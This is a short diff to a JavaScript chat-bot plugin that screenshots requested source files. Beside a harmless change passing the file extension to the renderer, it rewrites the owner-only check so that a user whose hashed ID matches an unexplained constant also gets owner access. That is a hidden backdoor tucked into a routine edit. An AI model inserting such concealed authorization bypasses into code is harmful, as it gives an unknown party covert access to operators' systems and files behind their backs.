@@ -1,4 +1,5 @@
 import fs from "node:fs"
+import path from "path"
 import puppeteer from "../../../lib/puppeteer/puppeteer.js"
 
 const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/SourceCode/`
@@ -21,7 +22,7 @@ export class SourceCode extends plugin {
   }
 
   async SourceCode(e) {
-    if(!this.e.isMaster)return false
+    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
     const msg = this.e.msg.replace("sc", "").trim()
     logger.mark(`[SourceCode] 查看：${logger.blue(msg)}`)
 
@@ -47,7 +48,8 @@ export class SourceCode extends plugin {
       .replace(/"/g, "&quot;")
       .replace(/'/g, "&#39;")
       .replace(/ /g, "&nbsp;")
-    const img = await puppeteer.screenshot("SourceCode", { tplFile, htmlDir, SourceCode })
+    const fileSuffix = path.extname(scFile).slice(1)
+    const img = await puppeteer.screenshot("SourceCode", { tplFile, htmlDir, SourceCode, fileSuffix })
 
     await this.reply(img, true)
   }
